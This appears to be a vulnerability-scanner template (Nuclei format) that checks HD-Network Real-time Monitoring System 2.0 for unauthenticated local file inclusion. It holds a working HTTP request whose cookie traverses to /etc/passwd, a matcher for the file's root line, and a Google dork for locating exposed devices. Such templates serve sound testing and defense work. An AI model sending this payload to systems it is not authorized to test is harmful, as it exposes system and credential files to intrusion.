id: hd-network-realtime-monitor-system-LFI

info:
  name: HD-Network Real-time Monitoring System 2.0 - Local File Inclusion
  author: Evan Rubinstein
  severity: critical
  description: |
    Instances of HD-Netowrk Real-time Monitoring System version 2.0 are vulnerable to a Local File Inclusion (LFI) vulnerability which allows remote unauthenticate attackers to view important, confidnetial information. Can be found by google dork: intitle:"HD-Network Real-time Monitoring System V2.0"
  reference:
    - https://www.exploit-db.com/exploits/50588
  tags: monitor,LFI,remote,unauthenticated

requests:
  - raw:
      - |
        GET /language/lang HTTP/1.1
        Referer: http://example.com
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
        Cookie: s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip,deflate,br
        Host: {{BaseURL}}
        Connection: Keep-alive

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200